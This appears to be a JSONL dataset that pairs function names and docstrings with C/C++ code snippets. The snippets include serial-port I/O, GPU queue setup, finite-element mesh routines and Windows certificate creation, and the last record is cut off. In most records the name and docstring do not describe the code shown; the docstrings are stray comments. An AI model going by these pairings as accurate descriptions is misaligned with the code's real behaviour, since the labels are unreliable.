{"content":"{'function_name': 'bulletin_board_init', 'docstring': '\/\/ load messages', 'code': 'int main (int argc, char** argv)\\n{\\n\\tif (argc != 3)\\n\\t{\\n\\t\\tcerr << \"Invalid usage!\" << endl;\\n\\t\\tcout << \"Format: <program> <user_data_file> <message_data_file>\" << endl;\\n\\t\\texit(-1);\\n\\t}\\n\\t\\n\\t\/\/ initialize bulletin board\\n\\tstring user_data_file(argv[1]);\\n\\tstring message_data_file(argv[2]);\\n\\t\\n\\tBulletinBoard bulletin_board;\\n\\tbulletin_board_init(bulletin_board, user_data_file, message_data_file);\\n\\tbulletin_board.run();\\n\\t\\n\\t\/\/ save messages and users\\n\\t\\n\\treturn 0;\\n}'}","id":2348}
{"content":"{'function_name': 'planner_reverse_pass', 'docstring': '\/\/Make a local copy of block_buffer_tail, because the interrupt can alter it', 'code': 'void planner_forward_pass_kernel(block_t *previous, block_t *current, block_t *next) {\\n    if(!previous) {\\n        PRINTLN(\"Exiting the planner_forward_pass_kernel since there is no previous block...\");\\n        return;\\n    }\\n    \\n    \/\/ If the previous block is an acceleration block, but it is not long enough to complete the\\n    \/\/ full speed change within the block, we need to adjust the entry speed accordingly. Entry\\n    \/\/ speeds have already been reset, maximized, and reverse planned by reverse planner.\\n    \/\/ If nominal length is true, max junction speed is guaranteed to be reached. No need to recheck.\\n    if (!previous->nominal_length_flag) {\\n        if (previous->entry_speed < current->entry_speed) {\\n            double entry_speed = std::min(current->entry_speed,max_allowable_speed(-previous->acceleration,previous->entry_speed,previous->millimeters));\\n            \\n            \/\/ Check for junction speed change\\n            if (current->entry_speed != entry_speed) {\\n                current->entry_speed = entry_speed;\\n                current->recalculate_flag = true;\\n            }\\n        }\\n    }\\n}'}","id":2349}
{"content":"{'function_name': 'kbin', 'docstring': '\/\/__fpurge(stdin); original works', 'code': 'int main()\\n{\\n\\n\/\/ New New Stuff\\n\\nprintf(\"Welcome to the Linear Serie Automated Test \\\\n \\\\n\");\\nprintf(\"Enter your Lid Name: \\\\n\");\\nkbin();\\nprintf(\"Welcome %s \\\\n Make your Supervivsor approve these settings \\\\n\", name);\\n\/\/ insert stuff here\\n\\nprintf(\"POULET! \\\\n\");\\nprintf(\"supervisor name:\");\\nkbin();\\nprintf(\"sup name = %s \\\\n\", name);\\nsupname = (name[14]);\\n\\n\\n\/\/ \/old  stuff  New Stuff\\nint input = 66;\\nchar input2 = 28;\\nchar line [3];\\nprintf(\"Input man \\\\n\");\\nstd::cin.get( line, 3);\\nstd::cout << line << \"\\\\n\";\\ninput2 = input;\\ninput = atoi (line);\\nprintf(\"the value of input is %d \\\\n\" ,input);\\n\\n\/\/ Now pour Modifier la valeur de ce que je desire configurer\\n\\nbigul1[9]={input};\\nbigul2[9]={input};\\n\/\/bigul5\\n\\nprintf(\" The value of bigul1 9 is %d \\\\n\", bigul1[9]);\\n\\n\/\/ End of New Stuff\\n\\n\\n    serialib LS;                                                            \/\/ Object of the serialib class\\n    int Ret;                                                                \/\/ Used for return values\\n\/\/    char Buffer[128];\\n\/\/    char Buffer[128];\\n    char Buffer[256];\\n    int Buffed[128];\\n\\n    \/\/ Open serial port\\n\\n    Ret=LS.Open(DEVICE_PORT,115200);                                        \/\/ Open serial link at 115200 bauds\\n    if (Ret!=1) {                                                           \/\/ If an error occured...\\n        printf (\"Error while opening port. Permission problem ?\\\\n\");        \/\/ ... display a message ...\\n        return Ret;                                                         \/\/ ... quit the application\\n    }\\n    printf (\"Serial port opened successfully !\\\\n\");\\n\\n\\n\\n\\n    \/\/ Write the AT command on the serial port\\n\\n    Ret=LS.Write (bigul1, 14);\\n    Ret=LS.Write (bigul2, 14);\\n    Ret=LS.Write (bigul3, 14);\\n    Ret=LS.Write (bigul4, 14);\\n    Ret=LS.Write (bigul5, 14);                                          \/\/ Send the command on the serial port\\n    if (Ret!=1) {                                                           \/\/ If the writting operation failed ...\\n        printf (\"Error while writing data\\\\n\");                              \/\/ ... display a message ...\\n        return Ret;                                                         \/\/ ... quit the application.\\n    }\\n    printf (\"Write operation is successful \\\\n\");\\n\\n\\n\\n\\n    \/\/ Read a string from the serial device\\n\/\/    Ret=LS.ReadString(Buffer,\\'\\\\n\\',128,5000);  \/\/ Read a maximum of 128 characters with a timeout of 5 seconds\\n\/\/    Ret=LS.ReadString(Buffer, 0xff,128,5000);   \/\/ The final character of the string must be a line feed (\\'\\\\n\\')\\n\/\/    if (Ret>0) {\\n\\t\/\/Buffed = atoi (Buffer);                                                              \/\/ If a string has been read from, print the string\\n\/\/\\tprintf (\"Miyuki : %d \\\\n\",Buffer);\\n       \/\/ printf (\"String read from serial port : %s\",Buffer);}\\n\/\/}\\n\/\/    else\\n\/\/        printf (\"TimeOut reached. No data received !\\\\n\");                   \/\/ If not, print a message.\\n\\n\\n\\n    \/\/ Close the connection with the device\\n\\n    LS.Close();\\n\\n    return 0;\\n}'}","id":2353}
{"content":"{'function_name': 'retrieve_data_from_firmware', 'docstring': '\/\/ Success', 'code': 'int get_remark_id_from_firmware(unsigned short *p_remark_id)\\n{\\n    int err = TP_SUCCESS,\\n        read_byte = 0;\\n    unsigned char data[2] = {0};\\n    unsigned short remark_id = 0;\\n    off_t result = 0,\\n          file_cur_position = 0;\\n\\n    \/\/\\n    \/\/ Validate Input Parameters\\n    \/\/\\n\\n    \/\/ Remark ID Buffer\\n    if (p_remark_id == NULL)\\n    {\\n        ERROR_PRINTF(\"%s: Invalid Parameter! (p_remark_id=0x%p)\\\\r\\\\n\", __func__, p_remark_id);\\n        err = TP_ERR_INVALID_PARAM;\\n        goto GET_REMARK_ID_FROM_FW_EXIT;\\n    }\\n\\n    \/\/\\n    \/\/ Save Current R\/W Position of File Handler\\n    \/\/\\n    result = lseek(g_firmware_fd, 0, SEEK_CUR);\\n    if(result < 0)\\n    {\\n        ERROR_PRINTF(\"%s: Fail to Get Current File R\/W Position! (result=%ld, errno=%d)\\\\r\\\\n\", __func__, result, errno);\\n        err = TP_ERR_FILE_IO_ERROR;\\n        goto GET_REMARK_ID_FROM_FW_EXIT;\\n    }\\n    file_cur_position = result;\\n    \/\/DEBUG_PRINTF(\"%s: Current File R\/W Position: %ld.\\\\r\\\\n\", __func__, file_cur_position);\\n\\n    \/\/\\n    \/\/ Get Remark ID from eKT FW File\\n    \/\/\\n\\n    \/\/ Re-locate File R\/W Position to \\'-4\\' (the Last 4 Byte) from the End of File.\\n    lseek(g_firmware_fd, -4L, SEEK_END);\\n\\n    \/\/ Read Data from File\\n    read_byte = read(g_firmware_fd, data, 2);  \/\/ 15 63 XX XX\\n    if(read_byte != 2)\\n    {\\n        err = TP_GET_DATA_FAIL;\\n        ERROR_PRINTF(\"%s: Fail to get 2 bytes of remark_id from fd %d! (read_byte=%d, errno=%d)\\\\r\\\\n\", __func__, g_firmware_fd, read_byte, errno);\\n        goto GET_REMARK_ID_FROM_FW_EXIT_1;\\n    }\\n\\n    \/\/ Read FW Remark ID\\n    \/\/remark_id = data[0] + (data[1] << 8);\\n    remark_id = TWO_BYTE_ARRAY_TO_WORD(data);\\n    DEBUG_PRINTF(\"%s: Remark ID: %04x.\\\\r\\\\n\", __func__, remark_id);\\n\\n    \/\/ Load Remark ID to Input Buffer\\n    *p_remark_id = remark_id;\\n\\n    \/\/ Success\\n    err = TP_SUCCESS;\\n\\nGET_REMARK_ID_FROM_FW_EXIT_1:\\n\\n    \/\/\\n    \/\/ Restore to Current R\/W Position of File Handler\\n    \/\/\\n    \/\/DEBUG_PRINTF(\"%s: Restore File R\/W Position to %ld.\\\\r\\\\n\", __func__, file_cur_position);\\n    lseek(g_firmware_fd, file_cur_position, SEEK_SET);\\n\\nGET_REMARK_ID_FROM_FW_EXIT:\\n\\n    return err;\\n}'}","id":2356}
{"content":"{'function_name': 'Pow', 'docstring': '\/\/01\u77e9\u9635', 'code': \"int main()\\n{\\n    long long n,i,j;ll matrci[maxn][maxn],k;\\n    \/\/cin>>n>>k;\/\/n\u4e3a\u77e9\u9635\u5927\u5c0f,k\u4e3a\u5e42\u6b21\\n    int t;\\n    cin>>t;\\n    while(t--){\\n        for(i=1;i<=9;i++)\\n            for(j=1;j<=9;j++)\\n                matrci[i][j]=0;\\n        matrci[1][4]=matrci[1][7]=matrci[2][1]=matrci[2][4]=matrci[2][7]=matrci[3][4]=matrci[3][1]=1;\\n        matrci[4][2]=matrci[4][5]=matrci[4][8]=matrci[5][2]=matrci[5][8]=matrci[6][2]=matrci[6][5]=1;\\n        matrci[7][3]=matrci[7][9]=matrci[8][6]=matrci[8][9]=matrci[9][3]=matrci[9][6]=1;\\n        cin>>n;\\n        if(n==1){\\n            cout<<3<<'\\\\n';\\n        }\\n        else if(n==2){\\n            cout<<9<<'\\\\n';\\n        }\\n        else{\\n            Pow(matrci,n-2,9);\\n            ll ans=0;\\n            for(i=1;i<=9;i++) {\\n                for (j = 1; j <= 9; j++) {\\n                    \/\/cout << matrci[i][j] << ' ';\\n                    ans = (ans + res[i][j]) % mod;\\n                }\\n               \/\/ cout<<endl;\\n            }\\n                cout<<ans<<'\\\\n';\\n\\n        }\\n    }\\n\\n    return 0;\\n}\"}","id":2360}
{"content":"{'function_name': 'listGpuDeviceNamesWrapper', 'docstring': '\/\/ initialize AMF', 'code': 'AMF_RESULT CreateCommandQueuesVIAamf(int deviceIndex, int32_t flag1, cl_command_queue *pcmdQueue1, int32_t flag2, cl_command_queue *pcmdQueue2, int amfDeviceType = AMF_CONTEXT_DEVICE_TYPE_GPU)\\n{\\n    bool AllIsOK = true;\\n\\n    if (NULL != pcmdQueue1)\\n    {\\n        clReleaseCommandQueue(*pcmdQueue1);\\n        *pcmdQueue1 = NULL;\\n    }\\n    if (NULL != pcmdQueue2)\\n    {\\n        clReleaseCommandQueue(*pcmdQueue2);\\n        *pcmdQueue2 = NULL;\\n    }\\n\\n    AMF_RESULT res = g_AMFFactory.Init(); \/\/ initialize AMF\\n    if (AMF_OK == res)\\n    {\\n        \/\/ Create default CPU AMF context.\\n        amf::AMFContextPtr contextAMF = NULL;\\n        res = g_AMFFactory.GetFactory()->CreateContext(&contextAMF);\\n\\n        contextAMF->SetProperty(AMF_CONTEXT_DEVICE_TYPE, amfDeviceType);\\n        if (AMF_OK == res)\\n        {\\n            amf::AMFComputeFactoryPtr pOCLFactory = NULL;\\n\\n#if !defined ENABLE_METAL\\n            res = contextAMF->GetOpenCLComputeFactory(&pOCLFactory);\\n            AMF_RETURN_IF_FAILED(res, L\"GetOpenCLComputeFactory failed\");\\n#else\\n            amf::AMFContext3Ptr context3(contextAMF);\\n            AMF_RETURN_IF_FALSE(context3 != nullptr, AMF_NOT_SUPPORTED);\\n\\n            res = context3->GetMetalComputeFactory(&pOCLFactory);\\n            AMF_RETURN_IF_FAILED(res, L\"GetMetalComputeFactory failed\");\\n#endif\\n\\n            if (AMF_OK == res)\\n            {\\n                amf_int32 deviceCount = pOCLFactory->GetDeviceCount();\\n                if (deviceIndex < deviceCount)\\n                {\\n                    amf::AMFComputeDevicePtr pDeviceAMF;\\n                    res = pOCLFactory->GetDeviceAt(deviceIndex, &pDeviceAMF);\\n                    if (nullptr != pDeviceAMF)\\n                    {\\n                        contextAMF->InitOpenCLEx(pDeviceAMF);\\n                        cl_context clContext = static_cast<cl_context>(pDeviceAMF->GetNativeContext());\\n                        cl_device_id clDevice = static_cast<cl_device_id>(pDeviceAMF->GetNativeDeviceID());\\n#ifdef RTQ_ENABLED\\n#define QUEUE_MEDIUM_PRIORITY 0x00010000\\n#define QUEUE_REAL_TIME_COMPUTE_UNITS 0x00020000\\n#endif\\n                        if (NULL != pcmdQueue1)\\n                        { \/\/user requested one queue\\n                            int ComputeFlag = 0;\\n                            amf_int64 Param = flag1 & 0x0FFFF;\\n#ifdef RTQ_ENABLED\\n                            if (QUEUE_MEDIUM_PRIORITY == (flag1 & QUEUE_MEDIUM_PRIORITY))\\n                            {\\n                                ComputeFlag = 2;\\n                            }\\n                            if (QUEUE_REAL_TIME_COMPUTE_UNITS == (flag1 & QUEUE_REAL_TIME_COMPUTE_UNITS))\\n                            {\\n                                ComputeFlag = 1;\\n                            }\\n#endif\\n                            cl_command_queue tempQueue = NULL;\\n                            pDeviceAMF->SetProperty(AMFQUEPROPERTY, Param);\\n                            amf::AMFComputePtr AMFDevice;\\n                            pDeviceAMF->CreateCompute(&ComputeFlag, &AMFDevice);\\n                            if (nullptr != AMFDevice)\\n                            {\\n                                tempQueue = static_cast<cl_command_queue>(AMFDevice->GetNativeCommandQueue());\\n                            }\\n                            if (NULL == tempQueue)\\n                            {\\n                                fprintf(stdout, \"createQueue failed to create cmdQueue1 \");\\n                                AllIsOK = false;\\n                            }\\n                            clRetainCommandQueue(tempQueue);\\n\\n                            *pcmdQueue1 = tempQueue;\\n                        }\\n\\n                        if (NULL != pcmdQueue2)\\n                        { \/\/user requested second queue\\n                            int ComputeFlag = 0;\\n                            amf_int64 Param = flag2 & 0x0FFFF;\\n#ifdef RTQ_ENABLED\\n                            if (QUEUE_MEDIUM_PRIORITY == (flag2 & QUEUE_MEDIUM_PRIORITY))\\n                            {\\n                                ComputeFlag = 2;\\n                            }\\n                            if (QUEUE_REAL_TIME_COMPUTE_UNITS == (flag2 & QUEUE_REAL_TIME_COMPUTE_UNITS))\\n                            {\\n                                ComputeFlag = 1;\\n                            }\\n#endif\\n                            cl_command_queue tempQueue = NULL;\\n                            pDeviceAMF->SetProperty(AMFQUEPROPERTY, Param);\\n                            amf::AMFComputePtr AMFDevice;\\n                            pDeviceAMF->CreateCompute(&ComputeFlag, &AMFDevice);\\n                            if (nullptr != AMFDevice)\\n                            {\\n                                tempQueue = static_cast<cl_command_queue>(AMFDevice->GetNativeCommandQueue());\\n                            }\\n                            if (NULL == tempQueue)\\n                            {\\n                                fprintf(stdout, \"createQueue failed to create cmdQueue2 \");\\n                                AllIsOK = false;\\n                            }\\n                            clRetainCommandQueue(tempQueue);\\n\\n                            *pcmdQueue2 = tempQueue;\\n                        }\\n                    }\\n                }\\n                else\\n                {\\n                    res = AMF_INVALID_ARG;\\n                }\\n            }\\n            pOCLFactory.Release();\\n        }\\n\\n        contextAMF.Release();\\n        g_AMFFactory.Terminate();\\n    }\\n    else\\n    {\\n        return AMF_NOT_INITIALIZED;\\n    }\\n\\n    if (false == AllIsOK)\\n    {\\n        if (NULL != pcmdQueue1)\\n        {\\n            if (NULL != *pcmdQueue1)\\n            {\\n                clReleaseCommandQueue(*pcmdQueue1);\\n                *pcmdQueue1 = NULL;\\n            }\\n        }\\n        if (NULL != pcmdQueue2)\\n        {\\n            if (NULL != *pcmdQueue2)\\n            {\\n                clReleaseCommandQueue(*pcmdQueue2);\\n                *pcmdQueue2 = NULL;\\n            }\\n        }\\n    }\\n\\n    return res;\\n}'}","id":2361}
{"content":"{'function_name': 'detect_cut_faces3', 'docstring': '\/\/std::cout<<\"In \\'detect_cut_face3\\'--> iso_val_interface = \"<<iso_val_interface<<std::endl;', 'code': 'void\\ndetect_cut_cells2(cuthho_mesh<T, ET>& msh, const Function& level_set_function)\\n{\\n    std::cout<<\"I AM IN DETECT CUT CELL2!!!!\"<<std::endl;\\n    \/\/typedef typename cuthho_mesh<T, ET>::face_type  face_type;\\n    typedef typename cuthho_mesh<T, ET>::point_type point_type;\\n    \/\/typedef typename cuthho_mesh<T, ET>::cell_type cell_type;\\n\\n    size_t cell_i = 0;\\n    for (auto& cl : msh.cells)\\n    {\\n        auto fcs = faces(msh, cl);\\n        std::array< std::pair<size_t, point_type>, 2 >  cut_faces;\\n\\n        size_t k = 0;\\n        for (size_t i = 0; i < fcs.size(); i++)\\n        {\\n            if ( is_cut(msh, fcs[i]) )\\n                cut_faces.at(k++) = std::make_pair(i, fcs[i].user_data.intersection_point);\\n        }\\n\\n        \/* If a face is cut, the cells that own the face are cut. Is this\\n         * unconditionally true? It should...fortunately this isn\\'t avionics\\n         * software *\/\\n\\n        if (k == 0)\\n        {\\n            \\n            auto is_positive = [&](const point_type& pt) -> bool {\\n            return level_set_function(pt) > 0;\\n            };\\n            \\n            \\n            auto pts = points(msh, cl);\\n            \\n            if ( std::all_of(pts.begin(), pts.end(), is_positive) )\\n                cl.user_data.location = element_location::IN_POSITIVE_SIDE;\\n            else\\n                cl.user_data.location = element_location::IN_NEGATIVE_SIDE;\\n     \\n            \\n            \\n            \\n            \/*\\n            auto pts = points(msh, cl);\\n            auto pt = pts.begin();\\n            size_t counter = 0;\\n            while( ( pt!= pts.end() ) && ( level_set_function(*pt,msh,cl) > 0 ) )\\n            {\\n                counter++;\\n                pt++;\\n                \\n            }\\n             \\n            if ( counter == pts.size() )\\n                cl.user_data.location = element_location::IN_POSITIVE_SIDE;\\n            else\\n                cl.user_data.location = element_location::IN_NEGATIVE_SIDE;\\n            *\/\\n             \\n        }\\n        \/\/MODIFICARE QUAAAA\\n        if (k == 2)\\n        {\\n            cl.user_data.location = element_location::ON_INTERFACE;\\n            auto p0 = cut_faces[0].second;\\n            auto p1 = cut_faces[1].second;\\n            auto pt = p1 - p0;\\n            auto pn = p0 + point<T,2>(-pt.y(), pt.x());\\n            auto pn_prova = (p0+p1)\/2.0 + 0.5*point<T,2>(-pt.y(), pt.x());\\n            \/\/if(offset(msh,cl)== 119)\\n            \/\/    std::cout<<\"p0 = \"<<p0<< \" , p1 =\"<<p1<<std::endl;\\n            \/\/ PRIMA ERA DA p0 ->   MODIFCATO, ora \u00e8 pt  medio!\\n            \/*\\n            if( !pt_in_cell(msh, pn, cl) )\\n            {\\n                std::cout<<\"I chose another pn to ordering interface_points in \\'detect_cut_cells2\\'.\"<<std::endl;\\n                T m_half = ( ps1.y() - pm.y() )\/( ps1.x() - pm.x() );\\n                T q = pm.y() - m_half * pm.x() ;\\n                auto pt_bdry = search_boundary( msh , cl , pm , m_half , q , lm , level_set_function ) ;\\n                auto lm_bdry = level_set_function( pt_bdry , msh , cl );\\n            }\\n            *\/\\n            if(offset(msh,cl)== 137 || offset(msh,cl)== 138 || offset(msh,cl)== 134||offset(msh,cl)== 103){\\n                std::cout<<yellow<<bold<<\"offset(msh,cl) = \"<<offset(msh,cl)<<reset<<std::endl;\\n                auto pn_bis = (p0+p1)\/2.0 + point<T,2>(-pt.y(), pt.x());\\n                std::cout<<\"pn_bis = \"<<pn_bis<< \" , level_set_function(pn_bis,msh,cl) =\"<<level_set_function(pn_bis,msh,cl) <<std::endl;\\n                auto pn_bis0 = (p0+p1)\/2.0 + 0.5* point<T,2>(-pt.y(), pt.x());\\n                std::cout<<\"pn_bis0 = \"<<pn_bis0<< \" , level_set_function(pn_bis0,msh,cl) =\"<<level_set_function(pn_bis0,msh,cl) <<std::endl;\\n                auto pn_bis1 = p0 + 0.5 * point<T,2>(-pt.y(), pt.x());\\n                std::cout<<\"pn_bis1 = \"<<pn_bis1<< \" , level_set_function(pn_bis1,msh,cl) =\"<<level_set_function(pn_bis1,msh,cl)<<\\'\\\\n\\' <<std::endl;\\n                \\n                std::cout<<\"pn = \"<<pn<< \" , p0 = \"<<p0<< \" , p1 = \"<<p1<<std::endl;\\n                std::cout<<\"level_set_function(pn,msh,cl) = \"<<level_set_function(pn,msh,cl)<< \" , level_set_function(p0,msh,cl) = \"<<level_set_function(p0,msh,cl)<< \" , level_set_function(pn,msh,cl) = \"<<level_set_function(p1,msh,cl)<<std::endl;\\n                std::cout<<\"p0 - point<T,2>(-pt.y(), pt.x()) = \"<<p0 - point<T,2>(-pt.y(), pt.x())<< \" , level_set_function(p0 - point<T,2>(-pt.y(), pt.x()),msh,cl) = \"<<level_set_function(p0 - point<T,2>(-pt.y(), pt.x()),msh,cl)<<std::endl;\\n            }\\n            \\n            \\n            if( !(signbit(level_set_function(pn,msh,cl)) == signbit(level_set_function(pn_prova,msh,cl))) ){\\n                pn = pn_prova ;\\n                std::cout<<\"pn = \"<<pn<< \" , pn_prova = \"<<pn_prova<< \" , level_set_function(pn,msh,cl) = \"<<level_set_function(pn,msh,cl)<< \" , level_set_function(pn_prova,msh,cl) = \"<<level_set_function(pn_prova,msh,cl) <<std::endl;\\n            }\\n            \\n            if ( level_set_function(pn,msh,cl) >= 0 )\\n            {\\n                cl.user_data.p0 = p1;\\n                cl.user_data.p1 = p0;\\n            }\\n            else\\n            {\\n                cl.user_data.p0 = p0;\\n                cl.user_data.p1 = p1;\\n            }\\n\\n            cl.user_data.interface.push_back(cl.user_data.p0);\\n            cl.user_data.interface.push_back(cl.user_data.p1);\\n        }\\n\\n        if ( k != 0 && k != 2 ){\\n            auto pts = points(msh,cl);\\n            std::cout<<\"Point[0] = \"<<pts[0]<<\" , point[1] = \"<<pts[1]<<\" , point[2] = \"<<pts[2]<<\" , point[3] = \"<<pts[3]<<std::endl;\\n            std::cout<<\"level_set_function(p0) = \"<<level_set_function(pts[0],msh,cl) << \" , level_set_function(p1) = \"<<level_set_function(pts[1],msh,cl)<< \" , level_set_function(p2) = \"<<level_set_function(pts[2],msh,cl)<< \" , level_set_function(p3) = \"<<level_set_function(pts[3],msh,cl)<<std::endl;\\n            for (size_t i = 0; i < fcs.size(); i++)\\n            {\\n                if ( is_cut(msh, fcs[i]) )\\n                  std::cout<<\"fcs[i].user_data.intersection_point = \"<<fcs[i].user_data.intersection_point<<std::endl;\\n            }\\n           \\n            std::cout<<\"ERROR: in cut cell \"<<cell_i<<\" there are k = \"<<k<<\" cuts!!!!\"<<std::endl;\\n            throw std::logic_error(\" --> Invalid number of cuts in cell\");\\n            \\n        }\\n\\n        cell_i++;\\n    }\\n}'}","id":2370}
{"content":"{'function_name': 'make_bernstein_local_cij_matrix_with_velocity', 'docstring': '\/\/ integration of order 2k', 'code': 'std::pair< Matrix<T, Dynamic, Dynamic> , Matrix<T, Dynamic, Dynamic> >\\nmake_bernstein_local_cij_matrix(const Mesh& msh, const typename Mesh::cell_type& cl, size_t degree, size_t di = 1)\\n{\\n    cell_basis_Bernstein<Mesh,T> cb(msh, cl, degree);\\n    auto cbs = cb.size();\\n\\n    Matrix<T, Dynamic, Dynamic> ret0 = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    Matrix<T, Dynamic, Dynamic> ret1 = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    \\n    \/\/ for Q1 , degree = 1-> integration of order 2\\n    auto qps = integrate(msh, cl, 2*(degree+di) ); \/\/ integration of order 2k\\n\\n    for (auto& qp : qps)\\n    {\\n        auto phi = cb.eval_basis(qp.first);\\n        \\n        auto phi_grad = cb.eval_gradients(qp.first);\\n        \\n        ret0 += qp.second * phi * ((phi_grad).col(0)).transpose();\\n    \\n        ret1 += qp.second * phi * ((phi_grad).col(1)).transpose();\\n    }\\n    \\n    \/*\\n    \/\/ CHECKING ORDER INTEGRATION\\n    Matrix<T, Dynamic, Dynamic> ret1_bis = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    \\n    \/\/ for Q1 , degree = 1-> integration of order 2\\n    auto qps2 = integrate(msh, cl, 2*(degree+di)); \/\/ integration of order 2k\\n\\n    for (auto& qp : qps2)\\n    {\\n        auto phi = cb.eval_basis(qp.first);\\n        \\n        auto phi_grad = cb.eval_gradients(qp.first);\\n    \\n        ret1_bis += qp.second * phi * ((phi_grad).col(1)).transpose();\\n    }\\n    \\n    std::cout<<\"THE CHECKING FOR CIJ ORDER IS \"<<\\'\\\\n\\'<<ret1 - ret1_bis<<std::endl;\\n    *\/\\n    return std::make_pair(ret0,ret1);\\n}'}","id":2371}
{"content":"{'function_name': 'denoiseb_rd8_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd9_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd9 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_2();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":2385}
{"content":"{'function_name': 'TLSCertSetCertRdnName', 'docstring': '\/\/\\r', 'code': 'DWORD \\r\\nTLSCreateSelfSignCertificate(\\r\\n    IN HCRYPTPROV hCryptProv,\\r\\n    IN DWORD dwKeySpec, \\r\\n    IN PBYTE pbSPK,\\r\\n    IN DWORD cbSPK,\\r\\n    IN DWORD dwNumExtensions,\\r\\n    IN PCERT_EXTENSION pCertExtension,\\r\\n    OUT PDWORD cbEncoded, \\r\\n    OUT PBYTE* pbEncoded\\r\\n)\\r\\n\/*\\r\\n\\r\\n*\/\\r\\n{\\r\\n    DWORD dwStatus=ERROR_SUCCESS;\\r\\n    DWORD index;\\r\\n\\r\\n#define MAX_EXTENSIONS_IN_SELFSIGN 40\\r\\n\\r\\n    SYSTEMTIME      sysTime;\\r\\n    FILETIME        ftTime;\\r\\n    CERT_EXTENSION  rgExtension[MAX_EXTENSIONS_IN_SELFSIGN];\\r\\n    int             iExtCount=0, iExtNotFreeCount=0;\\r\\n    FILETIME        ftNotBefore;\\r\\n    FILETIME        ftNotAfter;\\r\\n    ULARGE_INTEGER  ulSerialNumber;\\r\\n    TLSClientCertRDN certRdn;\\r\\n    \\r\\n    CERT_BASIC_CONSTRAINTS2_INFO basicConstraint;\\r\\n\\r\\n    \/\/ modify here is we want to set to different issuer name\\r\\n    LPTSTR szIssuerName;\\r\\n    szIssuerName = g_szComputerName;\\r\\n\\r\\n    \/\/static LPTSTR pszEnforce=L\"Enforce\";\\r\\n\\r\\n\\r\\n    CERT_RDN_ATTR rgNameAttr[] = { \\r\\n        {   \\r\\n            szOID_COMMON_NAME, \\r\\n            dwCertRdnValueType, \\r\\n            _tcslen(szIssuerName) * sizeof(TCHAR), \\r\\n            (UCHAR *)szIssuerName \\r\\n        },\\r\\n\\r\\n\/\/#if ENFORCE_LICENSING\\r\\n\/\/        {\\r\\n\/\/            szOID_BUSINESS_CATEGORY,\\r\\n\/\/            dwCertRdnValueType,\\r\\n\/\/            _tcslen(pszEnforce) * sizeof(TCHAR),\\r\\n\/\/            (UCHAR *)pszEnforce\\r\\n\/\/        },\\r\\n\/\/#endif       \\r\\n\\r\\n        {\\r\\n            szOID_LOCALITY_NAME, \\r\\n            dwCertRdnValueType, \\r\\n            _tcslen(g_pszScope) * sizeof(TCHAR), \\r\\n            (UCHAR *)g_pszScope\\r\\n        }\\r\\n\\r\\n    };\\r\\n                                    \\r\\n    CERT_RDN rgRDN[] = { sizeof(rgNameAttr)\/sizeof(rgNameAttr[0]), &rgNameAttr[0] };\\r\\n    CERT_NAME_INFO Name = {1, rgRDN};\\r\\n\\r\\n    certRdn.type = LSCERT_RDN_NAME_INFO_TYPE;\\r\\n    certRdn.pCertNameInfo = &Name;\\r\\n\\r\\n    memset(rgExtension, 0, sizeof(rgExtension));\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Set validity of self sign certificate\\r\\n    \/\/\\r\\n\\r\\n    \/\/\\r\\n    \/\/ If system time is not in sync, this will cause server\\r\\n    \/\/ can\\'t request cert. from license server\\r\\n    \/\/\\r\\n\\r\\n    memset(&sysTime, 0, sizeof(sysTime));\\r\\n    GetSystemTime(&sysTime);\\r\\n    sysTime.wYear = 1970;\\r\\n    if(TLSSystemTimeToFileTime(&sysTime, &ftNotBefore) == FALSE)\\r\\n    {\\r\\n        dwStatus = GetLastError();\\r\\n        goto cleanup;\\r\\n    }\\r\\n\\r\\n    \/\/\\r\\n    \/\/ draft-ietf-pkix-ipki-part1-06.txt section 4.1.2.5.1\\r\\n    \/\/  where year is greater or equal to 50, the year shall be interpreted as 19YY; and\\r\\n    \/\/  where year is less than 50, the year shall be interpreted as 20YY\\r\\n    \/\/\\r\\n    sysTime.wYear = PERMANENT_CERT_EXPIRE_DATE; \\r\\n    if(TLSSystemTimeToFileTime(&sysTime, &ftNotAfter) == FALSE)\\r\\n    {\\r\\n        dwStatus = GetLastError();\\r\\n        goto cleanup;\\r\\n    }\\r\\n\\r\\n    ulSerialNumber.LowPart = ftNotBefore.dwLowDateTime;\\r\\n    ulSerialNumber.HighPart = ftNotBefore.dwHighDateTime;\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Add basic constrains extension to indicate this is a CA certificate\\r\\n    \/\/\\r\\n    rgExtension[iExtCount].pszObjId = szOID_BASIC_CONSTRAINTS2;\\r\\n    rgExtension[iExtCount].fCritical = FALSE;\\r\\n\\r\\n    basicConstraint.fCA = TRUE;     \/\/ act as CA\\r\\n    basicConstraint.fPathLenConstraint = TRUE;\\r\\n    basicConstraint.dwPathLenConstraint = 0; \/\/ can only issue certificates \\r\\n                                             \/\/ to end-entities and not to further CAs\\r\\n    dwStatus=TLSCryptEncodeObject( \\r\\n                        X509_ASN_ENCODING,\\r\\n                        szOID_BASIC_CONSTRAINTS2,\\r\\n                        &basicConstraint,\\r\\n                        &(rgExtension[iExtCount].Value.pbData),\\r\\n                        &(rgExtension[iExtCount].Value.cbData)\\r\\n                    );\\r\\n    if(dwStatus != 